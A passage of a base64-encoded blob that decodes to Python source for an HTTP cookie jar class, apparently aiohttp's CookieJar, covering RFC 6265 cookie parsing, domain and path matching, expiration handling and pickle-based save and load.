yZWRpY2F0ZVxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBpc19pcF9hZGRyZXNzLCBuZXh0X3dob2xlX3NlY29uZFxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgTG9vc2VDb29raWVzLCBQYXRoTGlrZSwgU3RyT3JVUkxcclxuXHJcbl9fYWxsX18gPSAoIkNvb2tpZUphciIsICJEdW1teUNvb2tpZUphciIpXHJcblxyXG5cclxuQ29va2llSXRlbSA9IFVuaW9uW3N0ciwgIk1vcnNlbFtzdHJdIl1cclxuXHJcblxyXG5jbGFzcyBDb29raWVKYXIoQWJzdHJhY3RDb29raWVKYXIpOlxyXG4gICAgIiIiSW1wbGVtZW50cyBjb29raWUgc3RvcmFnZSBhZGhlcmluZyB0byBSRkMgNjI2NS4iIiJcclxuXHJcbiAgICBEQVRFX1RPS0VOU19SRSA9IHJlLmNvbXBpbGUoXHJcbiAgICAgICAgciJbXFx4MDlcXHgyMC1cXHgyRlxceDNCLVxceDQwXFx4NUItXFx4NjBcXHg3Qi1cXHg3RV0qIlxyXG4gICAgICAgIHIiKD9QPHRva2VuPltcXHgwMC1cXHgwOFxceDBBLVxceDFGXFxkOmEtekEtWlxceDdGLVxceEZGXSspIlxyXG4gICAgKVxyXG5cclxuICAgIERBVEVfSE1TX1RJTUVfUkUgPSByZS5jb21waWxlKHIiKFxcZHsxLDJ9KTooXFxkezEsMn0pOihcXGR7MSwyfSkiKVxyXG5cclxuICAgIERBVEVfREFZX09GX01PTlRIX1JFID0gcmUuY29tcGlsZShyIihcXGR7MSwyfSkiKVxyXG5cclxuICAgIERBVEVfTU9OVEhfUkUgPSByZS5jb21waWxlKFxyXG4gICAgICAgICIoamFuKXwoZmViKXwobWFyKXwoYXByKXwobWF5KXwoanVuKXwoanVsKXwiICIoYXVnKXwoc2VwKXwob2N0KXwobm92KXwoZGVjKSIsXHJcbiAgICAgICAgcmUuSSxcclxuICAgIClcclxuXHJcbiAgICBEQVRFX1lFQVJfUkUgPSByZS5jb21waWxlKHIiKFxcZHsyLDR9KSIpXHJcblxyXG4gICAgTUFYX1RJTUUgPSBkYXRldGltZS5kYXRldGltZS5tYXgucmVwbGFjZSh0emluZm89ZGF0ZXRpbWUudGltZXpvbmUudXRjKVxyXG5cclxuICAgIE1BWF8zMkJJVF9USU1FID0gZGF0ZXRpbWUuZGF0ZXRpbWUudXRjZnJvbXRpbWVzdGFtcCgyICoqIDMxIC0gMSlcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICAqLFxyXG4gICAgICAgIHVuc2FmZTogYm9vbCA9IEZhbHNlLFxyXG4gICAgICAgIHF1b3RlX2Nvb2tpZTogYm9vbCA9IFRydWUsXHJcbiAgICAgICAgdHJlYXRfYXNfc2VjdXJlX29yaWdpbjogVW5pb25bU3RyT3JVUkwsIExpc3RbU3RyT3JVUkxdLCBOb25lXSA9IE5vbmUsXHJcbiAgICAgICAgbG9vcDogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18obG9vcD1sb29wKVxyXG4gICAgICAgIHNlbGYuX2Nvb2tpZXMgPSBkZWZhdWx0ZGljdChcclxuICAgICAgICAgICAgU2ltcGxlQ29va2llXHJcbiAgICAgICAgKSAgIyB0eXBlOiBEZWZhdWx0RGljdFtzdHIsIFNpbXBsZUNvb2tpZVtzdHJdXVxyXG4gICAgICAgIHNlbGYuX2hvc3Rfb25seV9jb29raWVzID0gc2V0KCkgICMgdHlwZTogU2V0W1R1cGxlW3N0ciwgc3RyXV1cclxuICAgICAgICBzZWxmLl91bnNhZmUgPSB1bnNhZmVcclxuICAgICAgICBzZWxmLl9xdW90ZV9jb29raWUgPSBxdW90ZV9jb29raWVcclxuICAgICAgICBpZiB0cmVhdF9hc19zZWN1cmVfb3JpZ2luIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHRyZWF0X2FzX3NlY3VyZV9vcmlnaW4gPSBbXVxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZSh0cmVhdF9hc19zZWN1cmVfb3JpZ2luLCBVUkwpOlxyXG4gICAgICAgICAgICB0cmVhdF9hc19zZWN1cmVfb3JpZ2luID0gW3RyZWF0X2FzX3NlY3VyZV9vcmlnaW4ub3JpZ2luKCldXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKHRyZWF0X2FzX3NlY3VyZV9vcmlnaW4sIHN0cik6XHJcbiAgICAgICAgICAgIHRyZWF0X2FzX3NlY3VyZV9vcmlnaW4gPSBbVVJMKHRyZWF0X2FzX3NlY3VyZV9vcmlnaW4pLm9yaWdpbigpXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHRyZWF0X2FzX3NlY3VyZV9vcmlnaW4gPSBbXHJcbiAgICAgICAgICAgICAgICBVUkwodXJsKS5vcmlnaW4oKSBpZiBpc2luc3RhbmNlKHVybCwgc3RyKSBlbHNlIHVybC5vcmlnaW4oKVxyXG4gICAgICAgICAgICAgICAgZm9yIHVybCBpbiB0cmVhdF9hc19zZWN1cmVfb3JpZ2luXHJcbiAgICAgICAgICAgIF1cclxuICAgICAgICBzZWxmLl90cmVhdF9hc19zZWN1cmVfb3JpZ2luID0gdHJlYXRfYXNfc2VjdXJlX29yaWdpblxyXG4gICAgICAgIHNlbGYuX25leHRfZXhwaXJhdGlvbiA9IG5leHRfd2hvbGVfc2Vjb25kKClcclxuICAgICAgICBzZWxmLl9leHBpcmF0aW9ucyA9IHt9ICAjIHR5cGU6IERpY3RbVHVwbGVbc3RyLCBzdHJdLCBkYXRldGltZS5kYXRldGltZV1cclxuICAgICAgICAjICM0NTE1OiBkYXRldGltZS5tYXggbWF5IG5vdCBiZSByZXByZXNlbnRhYmxlIG9uIDMyLWJpdCBwbGF0Zm9ybXNcclxuICAgICAgICBzZWxmLl9tYXhfdGltZSA9IHNlbGYuTUFYX1RJTUVcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHNlbGYuX21heF90aW1lLnRpbWVzdGFtcCgpXHJcbiAgICAgICAgZXhjZXB0IE92ZXJmbG93RXJyb3I6XHJcbiAgICAgICAgICAgIHNlbGYuX21heF90aW1lID0gc2VsZi5NQVhfMzJCSVRfVElNRVxyXG5cclxuICAgIGRlZiBzYXZlKHNlbGYsIGZpbGVfcGF0aDogUGF0aExpa2UpIC0+IE5vbmU6XHJcbiAgICAgICAgZmlsZV9wYXRoID0gcGF0aGxpYi5QYXRoKGZpbGVfcGF0aClcclxuICAgICAgICB3aXRoIGZpbGVfcGF0aC5vcGVuKG1vZGU9IndiIikgYXMgZjpcclxuICAgICAgICAgICAgcGlja2xlLmR1bXAoc2VsZi5fY29va2llcywgZiwgcGlja2xlLkhJR0hFU1RfUFJPVE9DT0wpXHJcblxyXG4gICAgZGVmIGxvYWQoc2VsZiwgZmlsZV9wYXRoOiBQYXRoTGlrZSkgLT4gTm9uZTpcclxuICAgICAgICBmaWxlX3BhdGggPSBwYXRobGliLlBhdGgoZmlsZV9wYXRoKVxyXG4gICAgICAgIHdpdGggZmlsZV9wYXRoLm9wZW4obW9kZT0icmIiKSBhcyBmOlxyXG4gICAgICAgICAgICBzZWxmLl9jb29raWVzID0gcGlja2xlLmxvYWQoZilcclxuXHJcbiAgICBkZWYgY2xlYXIoc2VsZiwgcHJlZGljYXRlOiBPcHRpb25hbFtDbGVhckNvb2tpZVByZWRpY2F0ZV0gPSBOb25lKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHByZWRpY2F0ZSBpcyBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9uZXh0X2V4cGlyYXRpb24gPSBuZXh0X3dob2xlX3NlY29uZCgpXHJcbiAgICAgICAgICAgIHNlbGYuX2Nvb2tpZXMuY2xlYXIoKVxyXG4gICAgICAgICAgICBzZWxmLl9ob3N0X29ubHlfY29va2llcy5jbGVhcigpXHJcbiAgICAgICAgICAgIHNlbGYuX2V4cGlyYXRpb25zLmNsZWFyKClcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRvX2RlbCA9IFtdXHJcbiAgICAgICAgbm93ID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KGRhdGV0aW1lLnRpbWV6b25lLnV0YylcclxuICAgICAgICBmb3IgZG9tYWluLCBjb29raWUgaW4gc2VsZi5fY29va2llcy5pdGVtcygpOlxyXG4gICAgICAgICAgICBmb3IgbmFtZSwgbW9yc2VsIGluIGNvb2tpZS5pdGVtcygpOlxyXG4gICAgICAgICAgICAgICAga2V5ID0gKGRvbWFpbiwgbmFtZSlcclxuICAgICAgICAgICAgICAgIGlmIChcclxuICAgICAgICAgICAgICAgICAgICBrZXkgaW4gc2VsZi5fZXhwaXJhdGlvbnMgYW5kIHNlbGYuX2V4cGlyYXRpb25zW2tleV0gPD0gbm93XHJcbiAgICAgICAgICAgICAgICApIG9yIHByZWRpY2F0ZShtb3JzZWwpOlxyXG4gICAgICAgICAgICAgICAgICAgIHRvX2RlbC5hcHBlbmQoa2V5KVxyXG5cclxuICAgICAgICBmb3IgZG9tYWluLCBuYW1lIGluIHRvX2RlbDpcclxuICAgICAgICAgICAga2V5ID0gKGRvbWFpbiwgbmFtZSlcclxuICAgICAgICAgICAgc2VsZi5faG9zdF9vbmx5X2Nvb2tpZXMuZGlzY2FyZChrZXkpXHJcbiAgICAgICAgICAgIGlmIGtleSBpbiBzZWxmLl9leHBpcmF0aW9uczpcclxuICAgICAgICAgICAgICAgIGRlbCBzZWxmLl9leHBpcmF0aW9uc1soZG9tYWluLCBuYW1lKV1cclxuICAgICAgICAgICAgc2VsZi5fY29va2llc1tkb21haW5dLnBvcChuYW1lLCBOb25lKVxyXG5cclxuICAgICAgICBuZXh0X2V4cGlyYXRpb24gPSBtaW4oc2VsZi5fZXhwaXJhdGlvbnMudmFsdWVzKCksIGRlZmF1bHQ9c2VsZi5fbWF4X3RpbWUpXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBzZWxmLl9uZXh0X2V4cGlyYXRpb24gPSBuZXh0X2V4cGlyYXRpb24ucmVwbGFjZShcclxuICAgICAgICAgICAgICAgIG1pY3Jvc2Vjb25kPTBcclxuICAgICAgICAgICAgKSArIGRhdGV0aW1lLnRpbWVkZWx0YShzZWNvbmRzPTEpXHJcbiAgICAgICAgZXhjZXB0IE92ZXJmbG93RXJyb3I6XHJcbiAgICAgICAgICAgIHNlbGYuX25leHRfZXhwaXJhdGlvbiA9IHNlbGYuX21heF90aW1lXHJcblxyXG4gICAgZGVmIGNsZWFyX2RvbWFpbihzZWxmLCBkb21haW46IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNsZWFyKGxhbWJkYSB4OiBzZWxmLl9pc19kb21haW5fbWF0Y2goZG9tYWluLCB4WyJkb21haW4iXSkpXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+ICJJdGVyYXRvcltNb3JzZWxbc3RyXV0iOlxyXG4gICAgICAgIHNlbGYuX2RvX2V4cGlyYXRpb24oKVxyXG4gICAgICAgIGZvciB2YWwgaW4gc2VsZi5fY29va2llcy52YWx1ZXMoKTpcclxuICAgICAgICAgICAgeWllbGQgZnJvbSB2YWwudmFsdWVzKClcclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHN1bSgxIGZvciBpIGluIHNlbGYpXHJcblxyXG4gICAgZGVmIF9kb19leHBpcmF0aW9uKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jbGVhcihsYW1iZGEgeDogRmFsc2UpXHJcblxyXG4gICAgZGVmIF9leHBpcmVfY29va2llKHNlbGYsIHdoZW46IGRhdGV0aW1lLmRhdGV0aW1lLCBkb21haW46IHN0ciwgbmFtZTogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX25leHRfZXhwaXJhdGlvbiA9IG1pbihzZWxmLl9uZXh0X2V4cGlyYXRpb24sIHdoZW4pXHJcbiAgICAgICAgc2VsZi5fZXhwaXJhdGlvbnNbKGRvbWFpbiwgbmFtZSldID0gd2hlblxyXG5cclxuICAgIGRlZiB1cGRhdGVfY29va2llcyhzZWxmLCBjb29raWVzOiBMb29zZUNvb2tpZXMsIHJlc3BvbnNlX3VybDogVVJMID0gVVJMKCkpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiVXBkYXRlIGNvb2tpZXMuIiIiXHJcbiAgICAgICAgaG9zdG5hbWUgPSByZXNwb25zZV91cmwucmF3X2hvc3RcclxuXHJcbiAgICAgICAgaWYgbm90IHNlbGYuX3Vuc2FmZSBhbmQgaXNfaXBfYWRkcmVzcyhob3N0bmFtZSk6XHJcbiAgICAgICAgICAgICMgRG9uXCd0IGFjY2VwdCBjb29raWVzIGZyb20gSVBzXHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBpZiBpc2luc3RhbmNlKGNvb2tpZXMsIE1hcHBpbmcpOlxyXG4gICAgICAgICAgICBjb29raWVzID0gY29va2llcy5pdGVtcygpXHJcblxyXG4gICAgICAgIGZvciBuYW1lLCBjb29raWUgaW4gY29va2llczpcclxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoY29va2llLCBNb3JzZWwpOlxyXG4gICAgICAgICAgICAgICAgdG1wID0gU2ltcGxlQ29va2llKCkgICMgdHlwZTogU2ltcGxlQ29va2llW3N0cl1cclxuICAgICAgICAgICAgICAgIHRtcFtuYW1lXSA9IGNvb2tpZSAgIyB0eXBlOiBpZ25vcmVbYXNzaWdubWVudF1cclxuICAgICAgICAgICAgICAgIGNvb2tpZSA9IHRtcFtuYW1lXVxyXG5cclxuICAgICAgICAgICAgZG9tYWluID0gY29va2llWyJkb21haW4iXVxyXG5cclxuICAgICAgICAgICAgIyBpZ25vcmUgZG9tYWlucyB3aXRoIHRyYWlsaW5nIGRvdHNcclxuICAgICAgICAgICAgaWYgZG9tYWluLmVuZHN3aXRoKCIuIik6XHJcbiAgICAgICAgICAgICAgICBkb21haW4gPSAiIlxyXG4gICAgICAgICAgICAgICAgZGVsIGNvb2tpZVsiZG9tYWluIl1cclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBkb21haW4gYW5kIGhvc3RuYW1lIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgIyBTZXQgdGhlIGNvb2tpZVwncyBkb21haW4gdG8gdGhlIHJlc3BvbnNlIGhvc3RuYW1lXHJcbiAgICAgICAgICAgICAgICAjIGFuZCBzZXQgaXRzIGhvc3Qtb25seS1mbGFnXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9ob3N0X29ubHlfY29va2llcy5hZGQoKGhvc3RuYW1lLCBuYW1lKSlcclxuICAgICAgICAgICAgICAgIGRvbWFpbiA9IGNvb2tpZVsiZG9tYWluIl0gPSBob3N0bmFtZVxyXG5cclxuICAgICAgICAgICAgaWYgZG9tYWluLnN0YXJ0c3dpdGgoIi4iKTpcclxuICAgICAgICAgICAgICAgICMgUmVtb3ZlIGxlYWRpbmcgZG90XHJcbiAgICAgICAgICAgICAgICBkb21haW4gPSBkb21haW5bMTpdXHJcbiAgICAgICAgICAgICAgICBjb29raWVbImRvbWFpbiJdID0gZG9tYWluXHJcblxyXG4gICAgICAgICAgICBpZiBob3N0bmFtZSBhbmQgbm90IHNlbGYuX2lzX2RvbWFpbl9tYXRjaChkb21haW4sIGhvc3RuYW1lKTpcclxuICAgICAgICAgICAgICAgICMgU2V0dGluZyBjb29raWVzIGZvciBkaWZmZXJlbnQgZG9tYWlucyBpcyBub3QgYWxsb3dlZFxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIHBhdGggPSBjb29raWVbInBhdGgiXVxyXG4gICAgICAgICAgICBpZiBub3QgcGF0aCBvciBub3QgcGF0aC5zdGFydHN3aXRoKCIvIik6XHJcbiAgICAgICAgICAgICAgICAjIFNldCB0aGUgY29va2llXCdzIHBhdGggdG8gdGhlIHJlc3BvbnNlIHBhdGhcclxuICAgICAgICAgICAgICAgIHBhdGggPSByZXNwb25zZV91cmwucGF0aFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHBhdGguc3RhcnRzd2l0aCgiLyIpOlxyXG4gICAgICAgICAgICAgICAgICAgIHBhdGggPSAiLyJcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgIyBDdXQgZXZlcnl0aGluZyBmcm9tIHRoZSBsYXN0IHNsYXNoIHRvIHRoZSBlbmRcclxuICAgICAgICAgICAgICAgICAgICBwYXRoID0gIi8iICsgcGF0aFsxIDogcGF0aC5yZmluZCgiLyIpXVxyXG4gICAgICAgICAgICAgICAgY29va2llWyJwYXRoIl0gPSBwYXRoXHJcblxyXG4gICAgICAgICAgICBtYXhfYWdlID0gY29va2llWyJtYXgtYWdlIl1cclxuICAgICAgICAgICAgaWYgbWF4X2FnZTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBkZWx0YV9zZWNvbmRzID0gaW50KG1heF9hZ2UpXHJcbiAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBtYXhfYWdlX2V4cGlyYXRpb24gPSBkYXRldGltZS5kYXRldGltZS5ub3coXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRldGltZS50aW1lem9uZS51dGNcclxuICAgICAgICAgICAgICAgICAgICAgICAgKSArIGRhdGV0aW1lLnRpbWVkZWx0YShzZWNvbmRzPWRlbHRhX3NlY29uZHMpXHJcbiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IE92ZXJmbG93RXJyb3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1heF9hZ2VfZXhwaXJhdGlvbiA9IHNlbGYuX21heF90aW1lXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZXhwaXJlX2Nvb2tpZShtYXhfYWdlX2V4cGlyYXRpb24sIGRvbWFpbiwgbmFtZSlcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvb2tpZVsibWF4LWFnZSJdID0gIiJcclxuXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBleHBpcmVzID0gY29va2llWyJleHBpcmVzIl1cclxuICAgICAgICAgICAgICAgIGlmIGV4cGlyZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgZXhwaXJlX3RpbWUgPSBzZWxmLl9wYXJzZV9kYXRlKGV4cGlyZXMpXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgZXhwaXJlX3RpbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX2V4cGlyZV9jb29raWUoZXhwaXJlX3RpbWUsIGRvbWFpbiwgbmFtZSlcclxuICAgICAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb29raWVbImV4cGlyZXMiXSA9ICIiXHJcblxyXG4gICAgICAgICAgICBzZWxmLl9jb29raWVzW2RvbWFpbl1bbmFtZV0gPSBjb29raWVcclxuXHJcbiAgICAgICAgc2VsZi5fZG9fZXhwaXJhdGlvbigpXHJcblxyXG4gICAgZGVmIGZpbHRlcl9jb29raWVzKFxyXG4gICAgICAgIHNlbGYsIHJlcXVlc3RfdXJsOiBVUkwgPSBVUkwoKVxyXG4gICAgKSAtPiBVbmlvblsiQmFzZUNvb2tpZVtzdHJdIiwgIlNpbXBsZUNvb2tpZVtzdHJdIl06XHJcbiAgICAgICAgIiIiUmV0dXJucyB0aGlzIGphclwncyBjb29raWVzIGZpbHRlcmVkIGJ5IHRoZWlyIGF0dHJpYnV0ZXMuIiIiXHJcbiAgICAgICAgc2VsZi5fZG9fZXhwaXJhdGlvbigpXHJcbiAgICAgICAgcmVxdWVzdF91cmwgPSBVUkwocmVxdWVzdF91cmwpXHJcbiAgICAgICAgZmlsdGVyZWQ6IFVuaW9uWyJTaW1wbGVDb29raWVbc3RyXSIsICJCYXNlQ29va2llW3N0cl0iXSA9IChcclxuICAgICAgICAgICAgU2ltcGxlQ29va2llKCkgaWYgc2VsZi5fcXVvdGVfY29va2llIGVsc2UgQmFzZUNvb2tpZSgpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGhvc3RuYW1lID0gcmVxdWVzdF91cmwucmF3X2hvc3Qgb3IgIiJcclxuICAgICAgICByZXF1ZXN0X29yaWdpbiA9IFVSTCgpXHJcbiAgICAgICAgd2l0aCBjb250ZXh0bGliLnN1cHByZXNzKFZhbHVlRXJyb3IpOlxyXG4gICAgICAgICAgICByZXF1ZXN0X29yaWdpbiA9IHJlcXVlc3RfdXJsLm9yaWdpbigpXHJcblxyXG4gICAgICAgIGlzX25vdF9zZWN1cmUgPSAoXHJcbiAgICAgICAgICAgIHJlcXVlc3RfdXJsLnNjaGVtZSBub3QgaW4gKCJodHRwcyIsICJ3c3MiKVxyXG4gICAgICAgICAgICBhbmQgcmVxdWVzdF9vcmlnaW4gbm90IGluIHNlbGYuX3RyZWF0X2FzX3NlY3VyZV9vcmlnaW5cclxuICAgICAgICApXHJcblxyXG4gICAgICAgIGZvciBjb29raWUgaW4gc2VsZjpcclxuICAgICAgICAgICAgbmFtZSA9IGNvb2tpZS5rZXlcclxuICAgICAgICAgICAgZG9tYWluID0gY29va2llWyJkb21haW4iXVxyXG5cclxuICAgICAgICAgICAgIyBTZW5kIHNoYXJlZCBjb29raWVzXHJcbiAgICAgICAgICAgIGlmIG5vdCBkb21haW46XHJcbiAgICAgICAgICAgICAgICBmaWx0ZXJlZFtuYW1lXSA9IGNvb2tpZS52YWx1ZVxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBzZWxmLl91bnNhZmUgYW5kIGlzX2lwX2FkZHJlc3MoaG9zdG5hbWUpOlxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIGlmIChkb21haW4sIG5hbWUpIGluIHNlbGYuX2hvc3Rfb25seV9jb29raWVzOlxyXG4gICAgICAgICAgICAgICAgaWYgZG9tYWluICE9IGhvc3RuYW1lOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIGVsaWYgbm90IHNlbGYuX2lzX2RvbWFpbl9tYXRjaChkb21haW4sIGhvc3RuYW1lKTpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICBpZiBub3Qgc2VsZi5faXNfcGF0aF9tYXRjaChyZXF1ZXN0X3VybC5wYXRoLCBjb29raWVbInBhdGgiXSk6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgaWYgaXNfbm90X3NlY3VyZSBhbmQgY29va2llWyJzZWN1cmUiXTpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICAjIEl0XCdzIGNyaXRpY2FsIHdlIHVzZSB0aGUgTW9yc2VsIHNvIHRoZSBjb2RlZF92YWx1ZVxyXG4gICAgICAgICAgICAjIChiYXNlZCBvbiBjb29raWUgdmVyc2lvbikgaXMgcHJlc2VydmVkXHJcbiAgICAgICAgICAgIG1yc2xfdmFsID0gY2FzdCgiTW9yc2VsW3N0cl0iLCBjb29raWUuZ2V0KGNvb2tpZS5rZXksIE1vcnNlbCgpKSlcclxuICAgICAgICAgICAgbXJzbF92YWwuc2V0KGNvb2tpZS5rZXksIGNvb2tpZS52YWx1ZSwgY29va2llLmNvZGVkX3ZhbHVlKVxyXG4gICAgICAgICAgICBmaWx0ZXJlZFtuYW1lXSA9IG1yc2xfdmFsXHJcblxyXG4gICAgICAgIHJldHVybiBmaWx0ZXJlZFxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfaXNfZG9tYWluX21hdGNoKGRvbWFpbjogc3RyLCBob3N0bmFtZTogc3RyKSAtPiBib29sOlxyXG4gICAgICAgICIiIkltcGxlbWVudHMgZG9tYWluIG1hdGNoaW5nIGFkaGVyaW5nIHRvIFJGQyA2MjY1LiIiIlxyXG4gICAgICAgIGlmIGhvc3RuYW1lID09IGRvbWFpbjpcclxuICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICAgICAgaWYgbm90IGhvc3RuYW1lLmVuZHN3aXRoKGRvbWFpbik6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgICAgICBub25fbWF0Y2hpbmcgPSBob3N0bmFtZVs6IC1sZW4oZG9tYWluKV1cclxuXHJcbiAgICAgICAgaWYgbm90IG5vbl9tYXRjaGluZy5lbmRzd2l0aCgiLiIpOlxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuXHJcbiAgICAgICAgcmV0dXJuIG5vdCBpc19pcF9hZGRyZXNzKGhvc3RuYW1lKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfaXNfcGF0aF9tYXRjaChyZXFfcGF0aDogc3RyLCBjb29raWVfcGF0aDogc3RyKSAtPiBib29sOlxyXG4gICAgICAgICIiIkltcGxlbWVudHMgcGF0aCBtYXRjaGluZyBhZGhlcmluZyB0byBSRkMgNjI2NS4iIiJcclxuICAgICAgICBpZiBub3QgcmVxX3BhdGguc3RhcnRzd2l0aCgiLyIpOlxyXG4gICAgICAgICAgICByZXFfcGF0aCA9ICIvIlxyXG5cclxuICAgICAgICBpZiByZXFfcGF0aCA9PSBjb29raWVfcGF0aDpcclxuICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICAgICAgaWYgbm90IHJlcV9wYXRoLnN0YXJ0c3dpdGgoY29va2llX3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuXHJcbiAgICAgICAgaWYgY29va2llX3BhdGguZW5kc3dpdGgoIi8iKTpcclxuICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICAgICAgbm9uX21hdGNoaW5nID0gcmVxX3BhdGhbbGVuKGNvb2tpZV9wYXRoKSA6XVxyXG5cclxuICAgICAgICByZXR1cm4gbm9uX21hdGNoaW5nLnN0YXJ0c3dpdGgoIi8iKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIF9wYXJzZV9kYXRlKGNscywgZGF0ZV9zdHI6IHN0cikgLT4gT3B0aW9uYWxbZGF0ZXRpbWUuZGF0ZXRpbWVdOlxyXG4gICAgICAgICIiIkltcGxlbWVudHMgZGF0ZSBzdHJpbmcgcGFyc2luZyBhZGhlcmluZyB0byBSRkMgNjI2NS4iIiJcclxuICAgICAgICBpZiBub3QgZGF0ZV9zdHI6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgICAgIGZvdW5kX3RpbWUgPSBGYWxzZVxyXG4gICAgICAgIGZvdW5kX2RheSA9IEZhbHNlXHJcbiAgICAgICAgZm91bmRfbW9udGggPSBGYWxzZVxyXG4gICAgICAgIGZvdW5kX3llYXIgPSBGYWxzZVxyXG5cclxuICAgICAgICBob3VyID0gbWludXRlID0gc2Vjb25kID0gMFxyXG4gICAgICAgIGRheSA9IDBcclxuICAgICAgICBtb250aCA9IDBcclxuICAgICAgICB5ZWFyID0gMFxyXG5cclxuICAgICAgICBmb3IgdG9rZW5fbWF0Y2ggaW4gY2xzLkRBVEVfVE9LRU5TX1JFLmZpbmRpdGVyKGRhdGVfc3RyKTpcclxuXHJcbiAgICAgICAgICAgIHRva2VuID0gdG9rZW5fbWF0Y2guZ3JvdXAoInRva2VuIilcclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBmb3VuZF90aW1lOlxyXG4gICAgICAgICAgICAgICAgdGltZV9tYXRjaCA9IGNscy5EQVRFX0hNU19USU1FX1JFLm1hdGNoKHRva2VuKVxyXG4gICAgICAgICAgICAgICAgaWYgdGltZV9tYXRjaDpcclxuICAgICAgICAgICAgICAgICAgICBmb3VuZF90aW1lID0gVHJ1ZVxyXG4gICAgICAgICAgICAgICAgICAgIGhvdXIsIG1pbnV0ZSwgc2Vjb25kID0gKGludChzKSBmb3IgcyBpbiB0aW1lX21hdGNoLmdyb3VwcygpKVxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICBpZiBub3QgZm91bmRfZGF5OlxyXG4gICAgICAgICAgICAgICAgZGF5X21hdGNoID0gY2xzLkRBVEVfREFZX09GX01PTlRIX1JFLm1hdGNoKHRva2VuKVxyXG4gICAgICAgICAgICAgICAgaWYgZGF5X21hdGNoOlxyXG4gICAgICAgICAgICAgICAgICAgIGZvdW5kX2RheSA9IFRydWVcclxuICAgICAgICAgICAgICAgICAgICBkYXkgPSBpbnQoZGF5X21hdGNoLmdyb3VwKCkpXHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBmb3VuZF9tb250aDpcclxuICAgICAgICAgICAgICAgIG1vbnRoX21hdGNoID0gY2xzLkRBVEVfTU9OVEhfUkUubWF0Y2godG9rZW4pXHJcbiAgICAgICAgICAgICAgICBpZiBtb250aF9tYXRjaDpcclxuICAgICAgICAgICAgICAgICAgICBmb3VuZF9tb250aCA9IF